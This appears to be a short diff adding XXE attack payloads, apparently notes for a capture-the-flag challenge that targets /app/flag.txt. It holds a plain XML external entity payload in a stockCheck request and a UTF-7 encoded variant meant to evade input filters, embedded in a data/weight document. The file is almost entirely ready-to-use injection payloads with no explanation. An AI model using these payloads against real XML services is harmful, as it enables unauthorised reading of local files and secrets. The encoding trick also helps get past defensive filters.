@@ -1,0 +1,21 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///app/flag.txt"> ]>
+<stockCheck><productId>&xxe;</productId></stockCheck>
+
+/app/flag.txt
+
+UTF-7
++ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ACA-+ADw-+ACE-ENTITY+ACA-xxe+ACA-SYSTEM+ACA-+ACI-file:///app/flag.txt+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-
+
+
+<?xml version="1.0" encoding="UTF-7"?>
+
++ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ACA-+ADw-+ACE-ENTITY+ACA-xxe+ACA-SYSTEM+ACA-+ACI-file:///app/flag.txt+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-
+<data>
+<weight>
+&xxe;
+</weight>
+<height>
+1
+</height>
+</data>
